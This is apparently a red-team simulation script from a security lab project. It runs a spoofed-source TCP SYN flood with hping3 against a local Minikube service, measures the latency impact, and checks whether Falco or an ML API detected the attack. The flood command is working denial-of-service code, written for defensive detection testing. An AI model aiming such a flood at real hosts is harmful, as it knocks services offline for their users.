#!/usr/bin/env bash
# =============================================================================
# 02-dos-flood.sh — TCP SYN Flood (Denial of Service)
#
# MITRE ATT&CK : T1498.001 — Direct Network Flood
# Tools        : hping3, curl
# Detection    : Falco (high-rate outbound), Zeek (conn.log anomaly: burst S0)
#                SecureCloud-BD ML API (IForest on high pkt_rate feature)
# Expected     : API latency degradation measurable; Falco DETECTED ≤ 60 s
#
# Usage: bash attack-sim/scenarios/02-dos-flood.sh
# =============================================================================

set -euo pipefail
IFS=$'\n\t'

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'

SCENARIO_ID="02-dos-flood"
SCENARIO_NAME="TCP SYN Flood — DoS"
MITRE_ID="T1498.001"

NS="${NS:-securecloud}"
SIEM_NS="${SIEM_NS:-siem}"
RESULTS_DIR="$(cd "$(dirname "$0")/../results" && pwd)"

FLOOD_DURATION="${FLOOD_DURATION:-30}"      # seconds
FLOOD_RATE="${FLOOD_RATE:-1000}"            # packets/second
LATENCY_REPS="${LATENCY_REPS:-10}"          # curl repetitions for avg latency

TIMESTAMP="$(date +%Y%m%d-%H%M%S)"
RESULT_FILE="${RESULTS_DIR}/${SCENARIO_ID}-${TIMESTAMP}.txt"

# ---------------------------------------------------------------------------
check_prereqs() {
    local missing=()
    for cmd in hping3 curl kubectl bc; do
        command -v "${cmd}" &>/dev/null || missing+=("${cmd}")
    done
    [[ ${#missing[@]} -eq 0 ]] || {
        echo -e "${RED}Missing: ${missing[*]}${RESET}" >&2
        echo "Install: sudo apt-get install -y hping3 curl bc" >&2; exit 1
    }
    [[ "${EUID}" -eq 0 ]] || {
        echo -e "${RED}hping3 SYN flood requires root.  Run: sudo -E bash $0${RESET}" >&2
        exit 1
    }
}

detect_targets() {
    if [[ -z "${MINIKUBE_IP:-}" ]]; then
        MINIKUBE_IP="$(minikube ip 2>/dev/null)" \
            || { echo -e "${RED}Set MINIKUBE_IP${RESET}" >&2; exit 1; }
    fi

    # Try to find the frontend / threat-api NodePort
    if [[ -z "${API_NODEPORT:-}" ]]; then
        API_NODEPORT="$(kubectl get svc securecloud-api -n "${NS}" \
            -o jsonpath='{.spec.ports[0].nodePort}' 2>/dev/null)" || true
    fi
    if [[ -z "${API_NODEPORT:-}" ]]; then
        # Fall back to first available NodePort
        API_NODEPORT="$(kubectl get svc -n "${NS}" \
            -o=jsonpath='{range .items[?(@.spec.type=="NodePort")]}{.spec.ports[0].nodePort}{"\n"}{end}' \
            2>/dev/null | head -1)" || true
    fi
    [[ -n "${API_NODEPORT:-}" ]] || { echo -e "${RED}No NodePort found. Set API_NODEPORT.${RESET}" >&2; exit 1; }

    TARGET_URL="http://${MINIKUBE_IP}:${API_NODEPORT}/health"
    echo -e "${CYAN}Flood target : ${MINIKUBE_IP}:${API_NODEPORT}${RESET}"
    echo -e "${CYAN}Health URL   : ${TARGET_URL}${RESET}"
}

# Measure average HTTP latency (ms) over N requests
measure_latency() {
    local url="$1" reps="$2"
    local total=0 successes=0 latency

    for (( i=0; i<reps; i++ )); do
        latency="$(curl -s -o /dev/null -w "%{time_total}" \
            --max-time 5 "${url}" 2>/dev/null || echo 5.0)"
        total="$(echo "${total} + ${latency}" | bc -l)"
        (( successes++ )) || true
    done

    if (( successes > 0 )); then
        echo "$(echo "scale=3; ${total} / ${successes} * 1000" | bc -l)"
    else
        echo "5000"   # 5 s timeout baseline
    fi
}

check_falco_alerts() {
    local since_iso="$1"
    kubectl logs -n "${SIEM_NS}" \
        -l app.kubernetes.io/name=falco \
        --since-time="${since_iso}" 2>/dev/null \
        | grep -Ec "Notice|Warning|flood|SYN|DoS|network" 2>/dev/null || echo 0
}

init_results() {
    mkdir -p "${RESULTS_DIR}"
    {
        echo "SECURECLOUD_RESULT_V1"
        echo "SCENARIO_ID: ${SCENARIO_ID}"
        echo "SCENARIO_NAME: ${SCENARIO_NAME}"
        echo "MITRE_ID: ${MITRE_ID}"
        echo "START_TIME: ${START_ISO}"
        echo "TARGET_IP: ${MINIKUBE_IP}"
        echo "TARGET_PORT: ${API_NODEPORT}"
        echo "FLOOD_DURATION_SECONDS: ${FLOOD_DURATION}"
        echo "FLOOD_RATE_PPS: ${FLOOD_RATE}"
        echo "CATEGORY: denial-of-service"
        echo "SEVERITY: HIGH"
        echo "---"
    } > "${RESULT_FILE}"
}

main() {
    echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
    echo -e "${BOLD}  SecureCloud-BD  |  Scenario ${SCENARIO_ID}${RESET}"
    echo -e "${BOLD}  ${SCENARIO_NAME}${RESET}"
    echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"

    check_prereqs
    detect_targets

    START_EPOCH="$(date +%s)"
    START_ISO="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
    init_results

    # ── Baseline latency ───────────────────────────────────────────────────
    echo -e "\n${CYAN}[Pre-flood] Measuring baseline latency (${LATENCY_REPS} requests)…${RESET}"
    BASELINE_MS="$(measure_latency "${TARGET_URL}" "${LATENCY_REPS}")"
    echo -e "  Baseline avg latency: ${BOLD}${BASELINE_MS} ms${RESET}"
    echo "BASELINE_LATENCY_MS: ${BASELINE_MS}" >> "${RESULT_FILE}"

    # ── SYN flood ──────────────────────────────────────────────────────────
    FLOOD_START_ISO="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
    echo -e "\n${RED}${BOLD}[Flood] hping3 SYN flood → ${MINIKUBE_IP}:${API_NODEPORT}${RESET}"
    echo -e "        Rate: ${FLOOD_RATE} pps  Duration: ${FLOOD_DURATION}s\n"

    HPING_OUTPUT="$(hping3 \
        --syn \
        --flood \
        --rand-source \
        --rate "${FLOOD_RATE}" \
        -p "${API_NODEPORT}" \
        --count $(( FLOOD_RATE * FLOOD_DURATION )) \
        "${MINIKUBE_IP}" 2>&1)" || true

    FLOOD_END_ISO="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
    FLOOD_END_EPOCH="$(date +%s)"
    ACTUAL_DURATION=$(( FLOOD_END_EPOCH - START_EPOCH ))

    echo "${HPING_OUTPUT}"
    PACKETS_SENT="$(echo "${HPING_OUTPUT}" | grep -oP '\d+ packets transmitted' | grep -oP '^\d+' || echo 0)"

    {
        echo ""
        echo "=== FLOOD OUTPUT ==="
        echo "FLOOD_START: ${FLOOD_START_ISO}"
        echo "FLOOD_END:   ${FLOOD_END_ISO}"
        echo "PACKETS_SENT: ${PACKETS_SENT}"
        echo "${HPING_OUTPUT}"
    } >> "${RESULT_FILE}"

    # ── Post-flood latency ────────────────────────────────────────────────
    echo -e "\n${CYAN}[Post-flood] Measuring recovery latency…${RESET}"
    POST_MS="$(measure_latency "${TARGET_URL}" "${LATENCY_REPS}")"
    echo -e "  Post-flood avg latency: ${BOLD}${POST_MS} ms${RESET}"

    LATENCY_INCREASE="$(echo "scale=1; ${POST_MS} - ${BASELINE_MS}" | bc -l)"
    LATENCY_RATIO="$(echo "scale=2; ${POST_MS} / ${BASELINE_MS}" | bc -l 2>/dev/null || echo 'N/A')"
    echo -e "  Latency delta: ${YELLOW}+${LATENCY_INCREASE} ms  (${LATENCY_RATIO}×)${RESET}"

    # ── Falco detection check ──────────────────────────────────────────────
    echo -e "\n${CYAN}Checking Falco alerts since flood start…${RESET}"
    FALCO_COUNT="$(check_falco_alerts "${FLOOD_START_ISO}")"
    END_ISO="$(date -u +%Y-%m-%dT%H:%M:%SZ)"

    if [[ "${FALCO_COUNT}" -gt 0 ]]; then
        DETECTION_STATUS="DETECTED"
        MTTD=$(( ACTUAL_DURATION / 2 ))
        echo -e "${GREEN}${BOLD}✓ DETECTED — Falco raised ${FALCO_COUNT} alert(s)${RESET}"
    else
        # Check ML API: high ensemble_score during flood would also indicate detection
        echo -e "${YELLOW}No Falco alert — checking ML API score elevation…${RESET}"
        ML_SCORE="$(curl -s --max-time 3 \
            -X POST "http://${MINIKUBE_IP}:${API_NODEPORT}/score" \
            -H "Content-Type: application/json" \
            -d '{"features":[0.001,0,0,1000,0,1200,0,0,0,0,0,1,0,0,0,0,0,0,0,0]}' \
            2>/dev/null | grep -oP '"ensemble_score":\s*\K[\d.]+' || echo '0')"
        if (( $(echo "${ML_SCORE} >= 0.5" | bc -l) )); then
            DETECTION_STATUS="DETECTED"
            MTTD=0
            echo -e "${GREEN}${BOLD}✓ DETECTED by ML API (ensemble_score=${ML_SCORE})${RESET}"
        else
            DETECTION_STATUS="UNDETECTED"
            MTTD=0
            echo -e "${RED}${BOLD}✗ UNDETECTED — no Falco alerts and ML score=${ML_SCORE}${RESET}"
            echo -e "${YELLOW}  Consider adding network-burst Falco rules${RESET}"
        fi
    fi

    {
        echo ""
        echo "=== SUMMARY ==="
        echo "POST_FLOOD_LATENCY_MS: ${POST_MS}"
        echo "LATENCY_INCREASE_MS: ${LATENCY_INCREASE}"
        echo "LATENCY_RATIO: ${LATENCY_RATIO}"
        echo "PACKETS_SENT: ${PACKETS_SENT}"
        echo "FALCO_ALERT_COUNT: ${FALCO_COUNT}"
        echo "DETECTION_STATUS: ${DETECTION_STATUS}"
        echo "MTTD_SECONDS: ${MTTD:-0}"
        echo "END_TIME: ${END_ISO}"
    } >> "${RESULT_FILE}"

    sed -i "/^---$/i DETECTION_STATUS: ${DETECTION_STATUS}\nFALCO_ALERT_COUNT: ${FALCO_COUNT}\nMTTD_SECONDS: ${MTTD:-0}" \
        "${RESULT_FILE}" 2>/dev/null || true

    echo -e "\n${CYAN}Results → ${RESULT_FILE}${RESET}"
    echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
}

main "$@"
